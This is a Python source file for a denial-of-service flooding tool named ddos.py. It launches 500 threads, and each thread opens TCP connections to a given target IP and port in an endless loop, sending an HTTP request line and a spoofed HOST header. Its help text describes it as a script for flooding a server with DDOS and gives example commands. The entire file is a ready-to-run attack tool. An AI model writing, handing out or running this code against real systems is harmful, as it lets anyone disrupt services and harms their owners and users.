import threading
import socket 
import argparse

from utils import SmartDescriptionFormatter



TARGET_HEADER_MESSAGE = "GET / {target} HTTP/1.1\r\n"
FAKE_IP_HEADER = "HOST: {fake_ip} \r\n\r\n"



DDOS_FLOOD_NUMBER = 500



def attack(target, service_port, fake_ip=None):
    """
    Connect to the {target} using the {service_port} in an endless loop
    :param target:
    :param service_port:
    :param fake_ip:
    :return:
    """
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, service_port))

        if fake_ip is None:
            fake_ip = "192.168.112.7"

        s.sendto(
            TARGET_HEADER_MESSAGE.format(target=target).encode('ascii'),
            (target, service_port)
        )

        s.sendto(
            FAKE_IP_HEADER.format(fake_ip=fake_ip).encode("ascii"),
            (target, service_port)
        )
        s.close()



# Run the threads
def run_threads(args, flood_number=None):
    """
    Run the attack method {flood_number} of times
    :param flood_number:
    :param args:
    :return:
    """
    if flood_number is None:
        flood_number = DDOS_FLOOD_NUMBER
    for i in range(flood_number):
        thread = threading.Thread(target=attack, args=args)
        thread.start()


def main():
    parser = argparse.ArgumentParser(
        description="""
        Script for flooding a server / target with DDOS, basically multiple requests
        Example Usage:
            1. python ddos.py 10.10.10.8 80         -           Script attacks target(10.10.10.8) on port http=>80
            2. python ddos.py 10.10.10.8 80 -v      -           Adds a little bit of readability to the attack
        """,
        formatter_class=SmartDescriptionFormatter
    )
    parser.add_argument("target", help="Target IP address to flood with DDOS", type=str)
    parser.add_argument("service_port", help="Target port to attack", type=int)
    options = parser.parse_args()

    target = options.target 
    port = options.service_port 

    run_threads((target, port))


if __name__ == "__main__":
    main()



# TODO: Implement action for verbose flag -v